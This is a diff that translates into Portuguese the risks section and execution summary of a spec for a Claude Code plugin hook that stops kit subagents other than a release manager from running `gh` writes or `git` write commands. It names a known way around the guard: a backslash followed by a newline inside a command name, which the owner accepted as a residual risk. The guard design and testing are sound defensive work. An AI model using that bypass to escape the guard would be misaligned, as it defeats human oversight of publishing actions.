-Order: T-2701 and T-2702 may run in parallel (write sets are disjoint). T-2703 follows both (docs describe final text). T-2704 follows all. The release gate sequence is in R17: `dh validate`, `go test ./...`, `go run ./cmd/dh build` with no `dist/` diff, the clean-clone proof, then commit candidate; push, PR and tag only after the proof, and the merge only after the owner's ok (R18).
+Ordem: T-2701 e T-2702 podem rodar em paralelo (os conjuntos de escrita são disjuntos). T-2703 vem depois dos dois (os docs descrevem o texto final). T-2704 vem depois de todos. A sequência do gate de release está em R17: `dh validate`, `go test ./...`, `go run ./cmd/dh build` sem diff em `dist/`, a prova de clone limpo, depois o candidato a commit; push, PR e tag só depois da prova, e o merge só depois do ok do dono (R18).
 
-### Risks and pending decisions
+### Riscos e decisões pendentes
 
-- Risk: a legitimate kit subagent needs `git push` or a `gh` write · mitigation: only `release-manager` publishes (D1); the Coordinator dispatches it, or the main session runs the command. Fact: `grep -rn 'git push\|gh pr merge\|gh pr create' .agents .skills .commands` finds only prose that forbids or describes a residual risk, so no current flow of a non-release kit agent needs one.
-- Risk: the rule gives a false positive on a legitimate command · mitigation: the deny message points to the Grep tool, and the owner can run the command in the main session. The accepted cases are the ones listed in 2.3. The false-negative cases are the bypasses of 2.4.
-- Risk: a legitimate `gh` read outside the read list is denied · mitigation: the main session runs it, or a later PRD extends the list. Hypothesis: no current kit flow needs one; the ticket author runs `grep -rn 'gh ' .agents .skills .commands` and reports each `gh` call that the allow-list denies.
-- Risk: the engine may not pass `agentId` for `Monitor` and `PowerShell` calls, or `Monitor` may name its command field differently · mitigation: the R5 g engine test for `Monitor`. Fact: the `PowerShell` input carries the command text in `command`, a string, the same as `Bash` (Claude Code docs, hooks page, `PowerShell` `tool_input`). The mod denies a `PowerShell` call from a kit subagent in scope when `command` is missing or is not a string (R5 h). Hypothesis: `Monitor` uses `command` too; the ticket author confirms the field name from the engine type definitions. A `Monitor` call without `command` is a non-shell monitor and is not denied.
-- Risk: the engine may not pass `agentId` on a subagent's Bash call, or may not enforce `deny` in bypass mode · mitigation: M1 (R8). Fact: `hooks/runtime-guard.ts` already relies on `agentId` for `Write` and `Edit`, and `panel.engine.test.ts` already sends it. Hypothesis: the same holds for `Bash`; M1 proves it.
-- Risk: the opencode form starts with `cd`, so a `Bash(opencode:*)` allow rule does not match · accepted, stated in the recipe (R11), same as `claude`.
-- Assumption: the guard file name `gh-guard.ts` is the author's proposal.
-- Pending decision: none blocks the tickets. The only conditional is M1 (R8).
+- Risco: um subagente legítimo do kit precisa de `git push` ou de uma escrita do `gh` · mitigação: só o `release-manager` publica (D1); o Coordenador o despacha, ou a sessão principal roda o comando. Fato: `grep -rn 'git push\|gh pr merge\|gh pr create' .agents .skills .commands` acha só prosa que proíbe ou descreve um risco residual, então nenhum fluxo atual de um agente do kit que não seja de release precisa de um.
+- Risco: a regra dá um falso positivo em um comando legítimo · mitigação: a mensagem de negação aponta para a ferramenta Grep, e o dono pode rodar o comando na sessão principal. Os casos aceitos são os listados em 2.3. Os casos de falso negativo são os contornos de 2.4.
+- Risco: uma leitura legítima do `gh` fora da lista de leituras é negada · mitigação: a sessão principal a roda, ou um PRD posterior estende a lista. Hipótese: nenhum fluxo atual do kit precisa de uma; o autor do ticket roda `grep -rn 'gh ' .agents .skills .commands` e reporta cada chamada `gh` que a lista de permitidos nega.
+- Risco: o engine pode não passar `agentId` para chamadas de `Monitor` e `PowerShell`, ou o `Monitor` pode nomear seu campo de comando de outro jeito · mitigação: o teste do engine R5 g para o `Monitor`. Fato: a entrada do `PowerShell` traz o texto do comando em `command`, uma string, igual ao `Bash` (docs do Claude Code, página de hooks, `tool_input` do `PowerShell`). O mod nega uma chamada de `PowerShell` de um subagente do kit no escopo quando `command` falta ou não é uma string (R5 h). Hipótese: o `Monitor` também usa `command`; o autor do ticket confirma o nome do campo pelas definições de tipo do engine. Uma chamada de `Monitor` sem `command` é um monitor que não é de shell e não é negada.
+- Risco: o engine pode não passar `agentId` na chamada de Bash de um subagente, ou pode não aplicar `deny` no modo `bypass` · mitigação: M1 (R8). Fato: `hooks/runtime-guard.ts` já depende do `agentId` para `Write` e `Edit`, e o `panel.engine.test.ts` já o envia. Hipótese: o mesmo vale para o `Bash`; M1 prova.
+- Risco: a forma do opencode começa com `cd`, então uma regra de permissão `Bash(opencode:*)` não casa · aceito, declarado na receita (R11), igual ao `claude`.
+- Premissa: o nome de arquivo `gh-guard.ts` da trava é proposta do autor.
+- Decisão pendente: nenhuma bloqueia os tickets. A única condicional é M1 (R8).
 
-## Executed summary
+## Resumo executado
 
-- **Delivered:** In Claude Code, the mod denies `gh` outside a short read list, and `git` with a write word, in the Bash, Monitor and PowerShell calls of kit subagents except `release-manager`, by the short text rule of 2.3. The opencode recipe uses the measured v2.0.32 form, and the `external-clis` kill recipes use a recorded pid or a bracket pattern.
-- **Rules:**
-  - R1 Honored: `adapters/claude-code/plugin/hooks/lib/gh-guard.ts` exports `ghWriteVerb` and `ghDenied` with no I/O; its unit tests call it directly.
-  - R2 Honored: `adapters/claude-code/plugin/hooks/lib/gh-guard.test.ts`; QA round 8 ran the 192 cases of R2 with no denied case that became allowed; `claude plugin test` 250 pass, 0 fail, in the source and in `dist/`.
-  - R3 Honored: the `guardBash` path of `panel.ts` checks the Bash, Monitor and PowerShell calls; `hooks.json` is unchanged (QA of T-2704).
-  - R4 to R7 Honored: the engine tests in `panel.engine.test.ts` (cases a to h, the four parts of the deny message, fail-open on a guard error) pass (QA of T-2704 and rounds 2 to 8).
-  - R8 Honored: M1 pass, `<harness dir>/tasks/T-2704/evidence/m1-output.txt`: in bypass mode the `dh:qa-verifier` call was denied with the R6 message, and the `dh:release-manager` call printed the help text.
-  - R9 Honored: ADR-005 has the amendment dated 2026-10-21 with "Alterado por" PRD-027, and the 2026-10-22 amendment that records amendments 6 to 8 and the bypasses of 2.4.
-  - R10 to R16 Honored: the greps of the QA of T-2704 are clean; the counts stay at 13 agents, 19 + 1 commands and 14 templates; `dh validate` has 0 errors.
-  - R17 Honored: version 0.32.1 in `internal/build/build.go`, `.claude-plugin/marketplace.json` and the source ref; `CHANGELOG.md` and both roadmaps have 0.32.1; a second build changes only `generated_at`; `dh validate` 0 errors, `go test ./...` passes, `claude plugin test` 250 pass, 0 fail (QA round 8). The clean-clone proof runs on the commit candidate before the push, and the PR body records its result.
-  - R18 Honored: the PR touches `adapters/claude-code/plugin/hooks/**` and `.skills/external-clis/**`; the owner gave the merge ok on 2026-10-22.
-  - R19 Honored: `dh validate` (`checkPrivatePaths`) passes.
+- **Entregue:** No Claude Code, o mod nega `gh` fora de uma lista curta de leituras, e `git` com uma palavra de escrita, nas chamadas de Bash, Monitor e PowerShell de subagentes do kit exceto o `release-manager`, pela regra curta de texto de 2.3. A receita do opencode usa a forma medida da v2.0.32, e as receitas de kill do `external-clis` usam um pid registrado ou um padrão com colchetes.
+- **Regras:**
+  - R1 Cumprida: `adapters/claude-code/plugin/hooks/lib/gh-guard.ts` exporta `ghWriteVerb` e `ghDenied` sem E/S; seus testes unitários a chamam diretamente.
+  - R2 Cumprida: `adapters/claude-code/plugin/hooks/lib/gh-guard.test.ts`; a rodada 8 do QA rodou os 192 casos de R2 sem nenhum caso negado que passasse a ser permitido; `claude plugin test` 250 passam, 0 falham, na fonte e em `dist/`.
+  - R3 Cumprida: o caminho `guardBash` do `panel.ts` checa as chamadas de Bash, Monitor e PowerShell; o `hooks.json` está inalterado (QA do T-2704).
+  - R4 a R7 Cumpridas: os testes do engine em `panel.engine.test.ts` (casos a a h, as quatro partes da mensagem de negação, falha aberta em erro da trava) passam (QA do T-2704 e rodadas 2 a 8).
+  - R8 Cumprida: M1 passou, `<harness dir>/tasks/T-2704/evidence/m1-output.txt`: no modo `bypass` a chamada do `dh:qa-verifier` foi negada com a mensagem de R6, e a chamada do `dh:release-manager` imprimiu o texto de ajuda.
+  - R9 Cumprida: o ADR-005 tem a emenda datada de 2026-10-21 com "Alterado por" PRD-027, e a emenda de 2026-10-22 que registra as emendas 6 a 8 e os contornos de 2.4.
+  - R10 a R16 Cumpridas: os greps do QA do T-2704 estão limpos; as contagens continuam em 13 agentes, 19 + 1 comandos e 14 templates; o `dh validate` tem 0 erros.
+  - R17 Cumprida: versão 0.32.1 em `internal/build/build.go`, `.claude-plugin/marketplace.json` e no ref da fonte; o `CHANGELOG.md` e os dois roadmaps têm a 0.32.1; um segundo build muda só `generated_at`; `dh validate` 0 erros, `go test ./...` passa, `claude plugin test` 250 passam, 0 falham (rodada 8 do QA). A prova de clone limpo roda no candidato a commit antes do push, e o corpo do PR registra seu resultado.
+  - R18 Cumprida: o PR toca `adapters/claude-code/plugin/hooks/**` e `.skills/external-clis/**`; o dono deu o ok do merge em 2026-10-22.
+  - R19 Cumprida: o `dh validate` (`checkPrivatePaths`) passa.
 - **Tickets:**
-  - T-2701, `backend`, approved: QA round 8 PASS; code review `cli:codex/gpt-6-luna` approve in round 7.
-  - T-2702, `backend` (kit source), approved: QA of T-2704 (greps of R9 to R15).
-  - T-2703, `backend` (Go and docs), approved: QA round 8 (build, version, roadmap drift check of `dh validate`).
-  - T-2704, `teste (unitário e integração)`, approved: M1 pass; QA round 8 PASS.
-- **Docs:** `docs/adr/ADR-005-trava-de-runtime-por-mod.md`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/external-clis/SKILL.md` and `references/opencode.md`, `clone-isolation.md`, `live-tree-freeze.md`, `agy.md`, `claude.md`, `gotchas.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md`, `AGENTS.md` (line "Trava de `gh`").
-- **Out of scope:** the items of section 5, and the accepted bypasses of 2.4. Security review round 7 found one more: a backslash followed by a newline inside a command name. The owner accepted it as a residual risk on 2026-10-22 (option "a"); its one-line mitigation is a candidate for a later release.
+  - T-2701, `backend`, `approved`: rodada 8 do QA aprovada (`PASS`); revisão de código `cli:codex/gpt-6-luna` `approve` na rodada 7.
+  - T-2702, `backend` (fonte do kit), `approved`: QA do T-2704 (greps de R9 a R15).
+  - T-2703, `backend` (Go e docs), `approved`: rodada 8 do QA (build, versão, checagem de deriva do roadmap do `dh validate`).
+  - T-2704, `teste (unitário e integração)`, `approved`: M1 passou; rodada 8 do QA aprovada (`PASS`).
+- **Docs:** `docs/adr/ADR-005-trava-de-runtime-por-mod.md`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/external-clis/SKILL.md` e `references/opencode.md`, `clone-isolation.md`, `live-tree-freeze.md`, `agy.md`, `claude.md`, `gotchas.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md`, `AGENTS.md` (linha "Trava de `gh`").
+- **Fora do escopo:** os itens da seção 5, e os contornos aceitos de 2.4. A rodada 7 da revisão de segurança achou mais um: uma barra invertida seguida de nova linha dentro de um nome de comando. O dono o aceitou como risco residual em 2026-10-22 (opção "a"); sua mitigação de uma linha é candidata a um release posterior.
